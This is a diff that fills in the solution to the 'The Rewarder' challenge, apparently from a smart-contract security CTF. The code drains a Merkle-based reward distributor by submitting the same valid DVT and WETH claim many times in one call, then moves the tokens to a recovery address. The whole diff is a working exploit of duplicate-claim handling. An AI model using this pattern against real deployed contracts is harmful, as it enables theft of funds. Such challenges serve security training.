@@ -148,7 +148,58 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log(player, 'player');
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        console.log(dvt.balanceOf(player), 'dvt balance');
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        uint playerDvtClaim = 11524763827831882;
+        uint playerWethClaim = 1171088749244340;
+        uint dvtClaimsCount = distributor.getRemaining(address(dvt)) / playerDvtClaim;
+        uint wethClaimsCount = distributor.getRemaining(address(weth)) / playerWethClaim;
+
+        Claim[] memory claims = new Claim[](dvtClaimsCount + wethClaimsCount);
+
+        for (uint i = 0; i < dvtClaimsCount; i+=1) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: playerDvtClaim,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        for (uint i = dvtClaimsCount; i < dvtClaimsCount + wethClaimsCount; i+=1) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: playerWethClaim,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        vm.startPrank(player);
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        console.log(dvt.balanceOf(player), 'dvt balance');
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        console.log(dvt.balanceOf(recovery), 'recovery dvt balance');
+        console.log(weth.balanceOf(recovery), 'recovery weth balance');
     }
 
     /**
